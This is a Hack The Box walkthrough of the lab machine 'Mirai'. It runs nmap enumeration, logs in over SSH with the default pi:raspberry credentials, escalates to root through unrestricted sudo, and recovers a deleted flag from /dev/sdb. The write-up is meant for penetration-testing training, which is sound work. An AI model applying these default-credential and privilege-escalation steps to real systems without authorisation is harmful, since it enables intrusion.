# HTB - Mirai

#### Ip: 10.10.10.48
#### Name: Mirai
#### Difficulty: Easy

----------------------------------------------------------------------

Mirai.png

### Enumeration

I'll kick off enumerating this box with an Nmap scan covering all TCP ports. Here I'll also use the `-sC` and `-sV` flags to use basic scripts and to enumerate versions:

```text
┌──(ryan㉿kali)-[~/HTB/Mirai]
└─$ sudo nmap -p-  --min-rate 10000 10.10.10.48 -sC -sV   
[sudo] password for ryan: 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-22 14:52 CDT
Nmap scan report for 10.10.10.48
Host is up (0.087s latency).
Not shown: 65529 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u3 (protocol 2.0)
| ssh-hostkey: 
|   1024 aaef5ce08e86978247ff4ae5401890c5 (DSA)
|   2048 e8c19dc543abfe61233bd7e4af9b7418 (RSA)
|   256 b6a07838d0c810948b44b2eaa017422b (ECDSA)
|_  256 4d6840f720c4e552807a4438b8a2a752 (ED25519)
53/tcp    open  domain  dnsmasq 2.76
| dns-nsid: 
|_  bind.version: dnsmasq-2.76
80/tcp    open  http    lighttpd 1.4.35
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: lighttpd/1.4.35
1124/tcp  open  upnp    Platinum UPnP 1.0.5.13 (UPnP/1.0 DLNADOC/1.50)
32400/tcp open  http    Plex Media Server httpd
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Server returned status 401 but no WWW-Authenticate header.
|_http-title: Unauthorized
|_http-favicon: Plex
|_http-cors: HEAD GET POST PUT DELETE OPTIONS
32469/tcp open  upnp    Platinum UPnP 1.0.5.13 (UPnP/1.0 DLNADOC/1.50)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.28 seconds
```

For HTTP we have a blank page on port 80, and a Plex server sign in page on port 32400

plex.png

Running a directory scan against the site on port 80 we find an `/admin` page:

ferox.png

And heading to the site shows a pi-hole page, which is essentialy a DNS sinkhole built in a Raspberry Pi.

admin.png

### Exploitation

Because we know that SSH is running, lets try the default Raspberry Pi credentials of pi:raspberry to SSH into the box:

```text
┌──(ryan㉿kali)-[~/HTB/Mirai]
└─$ ssh pi@10.10.10.48                                 
The authenticity of host '10.10.10.48 (10.10.10.48)' can't be established.
ED25519 key fingerprint is SHA256:TL7joF/Kz3rDLVFgQ1qkyXTnVQBTYrV44Y2oXyjOa60.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.48' (ED25519) to the list of known hosts.
pi@10.10.10.48's password: 

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Aug 27 14:47:50 2017 from localhost

SSH is enabled and the default password for the 'pi' user has not been changed.
This is a security risk - please login as the 'pi' user and type 'passwd' to set a new password.


SSH is enabled and the default password for the 'pi' user has not been changed.
This is a security risk - please login as the 'pi' user and type 'passwd' to set a new password.

pi@raspberrypi:~ $ whoami && hostname
pi
raspberrypi
```

Nice, that worked!

We can now grab the user.txt flag:

user_flag.png

### Privilege Escalation

Running `sudo -l` to see what we can run with elevated permissions, we find we can run anything we want:

```text
pi@raspberrypi:~/Desktop $ sudo -l
Matching Defaults entries for pi on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User pi may run the following commands on localhost:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: ALL
```

Lets go ahead and run `sudo /bin/bash` to escalate our shell:

```text
pi@raspberrypi:~/Desktop $ sudo /bin/bash
root@raspberrypi:/home/pi/Desktop# whoami
root
root@raspberrypi:/home/pi/Desktop# id
uid=0(root) gid=0(root) groups=0(root)
```

Trying to grab the root flag however, we find a note:

```text
root@raspberrypi:/home/pi/Desktop# cd /root
root@raspberrypi:~# ls
root.txt
root@raspberrypi:~# cat root.txt
I lost my original root.txt! I think I may have a backup on my USB stick...
```

Usb materials are frequently stored in `/media` so lets check there:

```text
root@raspberrypi:~# cd /media
root@raspberrypi:/media# ls
usbstick
root@raspberrypi:/media# cd usbstick
root@raspberrypi:/media/usbstick# ls -la
total 18
drwxr-xr-x 3 root root  1024 Aug 14  2017 .
drwxr-xr-x 3 root root  4096 Aug 14  2017 ..
-rw-r--r-- 1 root root   129 Aug 14  2017 damnit.txt
drwx------ 2 root root 12288 Aug 14  2017 lost+found
root@raspberrypi:/media/usbstick# cat damnit.txt 
Damnit! Sorry man I accidentally deleted your files off the USB stick.
Do you know if there is any way to get them back?

-James
```

Hmmm, lets see if anything is mounted:

mount.png

Interesting, this points us to `/dev/sdb`

And running `strings` against the file reveals the root.txt flag:

strings.png

Thanks for following along!

-Ryan

-----------------------------------------------------------------



